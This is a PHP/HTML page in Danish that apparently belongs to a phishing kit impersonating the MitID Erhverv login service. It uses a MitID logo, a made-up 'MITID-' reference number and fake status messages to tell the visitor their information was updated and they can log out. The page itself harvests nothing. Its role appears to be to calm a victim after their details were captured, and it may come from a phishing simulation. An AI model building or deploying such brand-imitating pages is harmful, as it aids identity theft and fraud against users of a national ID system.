<?php
include "include/session.php";
// Generate a stable per-session reference number: MITID-<year>-<5 digits>
if (empty($_SESSION['done_ref'])) {
    $_SESSION['done_ref'] = 'MITID-' . date('Y') . '-' . str_pad(mt_rand(0, 99999), 5, '0', STR_PAD_LEFT);
}
$ref = htmlspecialchars($_SESSION['done_ref'], ENT_QUOTES, 'UTF-8');
?>
<!doctype html>
<html lang="da">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Opdatering gennemført - AuthorisedTest Erhverv</title>
<link rel="icon" type="image/x-icon" href="static/media/favicon.ico">
<style>
/* ── Roboto (local, matches brand font) ── */
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;src:url(static/media/roboto-latin-400-normal.b009a76ad6afe4ebd301.woff2) format('woff2'),url(static/media/roboto-latin-400-normal.3f2b9a42f643e62a49b7.woff) format('woff')}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;font-display:swap;src:url(static/media/roboto-latin-500-normal.f25d774ecfe0996f8eb5.woff2) format('woff2'),url(static/media/roboto-latin-500-normal.1f075502d0094a398e21.woff) format('woff')}
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;src:url(static/media/roboto-latin-ext-400-normal.861b791f9de857a6e7bc.woff2) format('woff2'),url(static/media/roboto-latin-ext-400-normal.e757c42df6aaa3e11b62.woff) format('woff')}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;font-display:swap;unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;src:url(static/media/roboto-latin-ext-500-normal.9165081d10e1ba601384.woff2) format('woff2'),url(static/media/roboto-latin-ext-500-normal.252057e589a0379208ed.woff) format('woff')}

*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{font-family:Roboto,'Helvetica Neue',Arial,sans-serif;background:#fff;color:#333;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px}
.hidden{display:none!important}

/* ── CARD ── */
.login-card{width:100%;max-width:440px;background:#fff;border:1px solid #d0d0d0;border-radius:4px;box-shadow:0 1px 4px rgba(0,0,0,.06);padding:36px 38px;display:flex;flex-direction:column;align-items:center;text-align:center}

.card-logo{display:flex;flex-direction:column;align-items:center;margin-bottom:24px}
.logo-main{display:flex;align-items:center;gap:2px;font-size:34px;font-weight:700;color:#0060e6;line-height:1}
.logo-main img{height:34px;width:auto;display:block;object-fit:contain}
.logo-sub{font-size:15px;font-weight:600;color:#0060e6;letter-spacing:.04em;margin-top:2px}

/* ── SUCCESS SVG ── */
.svg-holder{position:relative;width:104px;height:104px;margin:2px 0 22px}
.success-svg{position:absolute;inset:0;width:104px;height:104px}
.success-svg circle.ring{fill:none;stroke:#2e9e5b;stroke-width:3;stroke-linecap:round;stroke-dasharray:166;stroke-dashoffset:166;animation:draw .6s ease-out forwards}
.success-svg path.check{fill:none;stroke:#2e9e5b;stroke-width:4.5;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:48;stroke-dashoffset:48;animation:draw .4s ease-out .55s forwards}
.success-svg circle.spark{fill:#2e9e5b;opacity:0;animation:spark .5s ease-out forwards}
@keyframes draw{to{stroke-dashoffset:0}}
@keyframes spark{0%{opacity:0;transform:scale(0)}60%{opacity:1;transform:scale(1.25)}100%{opacity:0;transform:scale(1)}}
.pulse-ring{position:absolute;inset:0;border-radius:50%;border:2px solid rgba(46,158,91,.35);opacity:0;animation:pulse 1.6s ease-out .9s infinite}
@keyframes pulse{0%{transform:scale(.72);opacity:.9}100%{transform:scale(1.28);opacity:0}}

/* ── TITLE / SUB ── */
.done-title{font-size:21px;font-weight:700;color:#1c6b3c;margin-bottom:10px}
.done-sub{font-size:14px;color:#666;line-height:1.55;max-width:320px;margin-bottom:22px}

/* ── REFERENCE BOX ── */
.reference-box{width:100%;max-width:340px;margin-bottom:22px;padding:14px 16px;background:#f4f8ff;border:1px solid #d4e2f5;border-radius:4px}
.ref-label{display:block;font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:#5c708a;margin-bottom:6px}
.ref-id{font-size:17px;font-weight:700;letter-spacing:.04em;color:#0060e6;font-variant-numeric:tabular-nums}

/* ── STATUS LIST ── */
.status-list{width:100%;max-width:340px;text-align:left;margin-bottom:24px;border:1px solid #ececec;border-radius:4px;padding:6px 16px}
.status-item{display:flex;align-items:flex-start;gap:12px;padding:11px 0;border-bottom:1px solid #f2f2f2}
.status-item:last-child{border-bottom:none}
.status-icon{flex:0 0 auto;width:22px;height:22px;margin-top:1px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#e3f3e9;color:#2e9e5b;font-size:13px;font-weight:700}
.status-icon.pending{background:#fff4e5;color:#e8890c}
.status-icon.pending::after{content:"";width:8px;height:8px;border-radius:50%;background:#e8890c;animation:blink 1.2s ease-in-out infinite}
@keyframes blink{0%,100%{opacity:.35}50%{opacity:1}}
.status-body{flex:1;min-width:0}
.status-title{font-size:14px;font-weight:700;color:#222;margin-bottom:2px}
.status-desc{font-size:12.5px;color:#777;line-height:1.45}

/* ── LOGOUT ── */
.logout-label{font-size:13px;color:#666;margin-bottom:10px}
.btn-primary{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;max-width:300px;height:48px;border:none;border-radius:0;font-size:14px;font-weight:700;letter-spacing:.08em;color:#fff;background:#0060e6;cursor:pointer;transition:background .2s;font-family:inherit}
.btn-primary:hover{background:#004aa5}
.arrow-icon{display:inline-flex;align-items:center}
.fallback-msg{margin-top:14px;font-size:12px;color:#999;line-height:1.5}

@media(max-width:480px){
  body{padding:0}
  .login-card{width:100%;max-width:100%;min-height:100vh;min-height:100dvh;border:none;box-shadow:none;border-radius:0;padding:28px 22px}
}
</style>
</head>
<body>

<!-- CARD -->
<div class="login-card">

  <!-- CENTERED AuthorisedTest ERHVERV LOGO -->
  <div class="card-logo">
    <div class="logo-main">
      <img class="logo-img" src="static/media/MiTD-logo.png" alt="MitID">
    </div>
    <div class="logo-sub">Erhverv</div>
  </div>

  <!-- ANIMATED SVG SUCCESS -->
  <div class="svg-holder">
    <div class="pulse-ring" aria-hidden="true"></div>
    <svg class="success-svg" viewBox="0 0 52 52" aria-hidden="true">
      <circle class="ring" cx="26" cy="26" r="24"/>
      <path class="check" d="M14 27l8 8 16-16"/>
      <circle class="spark" cx="38" cy="14" r="2.1" style="animation-delay:.85s"/>
      <circle class="spark" cx="44" cy="27" r="1.6" style="animation-delay:1.0s"/>
      <circle class="spark" cx="9" cy="21" r="1.7" style="animation-delay:1.15s"/>
    </svg>
  </div>

  <!-- TITLE / SUB -->
  <h1 class="done-title">Opdatering gennemført</h1>
  <p class="done-sub">Dine oplysninger er blevet opdateret. Du kan logge ud eller lukke vinduet.</p>

  <!-- REFERENCE NR -->
  <div class="reference-box">
    <span class="ref-label">Reference nr.</span>
    <span class="ref-id" id="refId"><?php echo $ref; ?></span>
  </div>

  <!-- STATUS LIST -->
  <div class="status-list">
    <div class="status-item">
      <div class="status-icon">✓</div>
      <div class="status-body">
        <div class="status-title">Opdatering er modtaget</div>
        <div class="status-desc">Dine oplysninger er registreret i systemet.</div>
      </div>
    </div>
    <div class="status-item">
      <div class="status-icon">✓</div>
      <div class="status-body">
        <div class="status-title">Opdatering i gang</div>
        <div class="status-desc">Bekræftelse sendes</div>
      </div>
    </div>
    <div class="status-item">
      <div class="status-icon pending"></div>
      <div class="status-body">
        <div class="status-title">Bekræftelse sendes</div>
        <div class="status-desc">Du modtager en bekræftelse, når opdateringen er gennemført.</div>
      </div>
    </div>
  </div>

  <!-- LOGOUT -->
  <p class="logout-label">Du kan logge ud her:</p>
  <button id="logoutBtn" class="btn-primary" type="button">
    <span>LOG UD</span>
    <span class="arrow-icon">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff"><path d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z"/></svg>
    </span>
  </button>
  <p id="fallbackMsg" class="fallback-msg hidden">
    Hvis vinduet ikke lukker automatisk, kan du lukke fanen manuelt.
  </p>
</div>

<script>
document.getElementById('logoutBtn').addEventListener('click', function(){
  try { window.close(); } catch(e) {}
  // Browsers only allow window.close() for script-opened tabs —
  // show a friendly fallback if the tab is still open.
  setTimeout(function(){
    document.getElementById('fallbackMsg').classList.remove('hidden');
  }, 600);
});
</script>
</body>
</html>
